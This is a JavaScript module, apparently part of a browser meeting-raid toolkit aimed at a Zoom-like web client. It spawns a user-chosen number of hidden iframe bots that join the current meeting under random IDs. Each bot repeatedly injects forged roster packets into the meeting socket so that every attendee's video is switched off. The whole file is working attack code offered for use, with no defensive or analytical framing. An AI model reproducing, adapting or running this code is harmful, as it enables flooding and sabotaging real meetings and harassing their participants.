import SDK from "../SDK/SDK";

let offset = 0;

function createBot(container) {
    let frame = document.createElement('iframe');
    frame.src = meetingURL;
    frame.style.display = 'none';
    container.appendChild(frame);

    let botSDK = new SDK(frame.contentWindow);
    frame.contentWindow.thugbot = true;

    frame.onload = function () {
        const module = Object.values(botSDK.hooks.findModule("webClient_meetingUqiueId:")).find(prop => prop?.webClient_meetingUqiueId);
        if (module) {
            module.webClient_meetingUqiueId = Math.random().toString(36).substring(2, 7);
        }

        botSDK.loaded = true;

        // Try to disable everyone's video every few seconds
        setInterval(function () {
            try {
                let updates = botSDK.hooks.state.attendeesList.attendeesList.map(attendee => ({
                    bVideoOn: false,
                    id: attendee.userId
                }));

                let packet = {
                    evt: botSDK.hooks.packets.WS_CONF_ROSTER_INDICATION,
                    body: {
                        add: null,
                        remove: null,
                        update: updates
                    }
                };

                botSDK.hooks.meetingSocket.handlers.onMessage({
                    data: JSON.stringify(packet)
                });
            } catch (error) {

            }
        }, 3000);
    };

    window.bots.push(botSDK);
    return { botSDK };
}

function FloodMeeting() {
    window.bots = window.bots || [];
    let mainSDKInstance = this;
    let amount = parseInt(prompt("How many bots?"), 10);

    localStorage.clear();
    window.meetingURL = mainSDKInstance.scope.location.href;

    let containerFrame = document.createElement('iframe');
    containerFrame.style.display = 'none';
    containerFrame.src = 'about:blank';
    document.body.appendChild(containerFrame);

    for (let i = 0; i < amount; i++) {
        createBot(containerFrame.contentWindow.document.body);
    }

    offset++;
}

export default FloodMeeting;
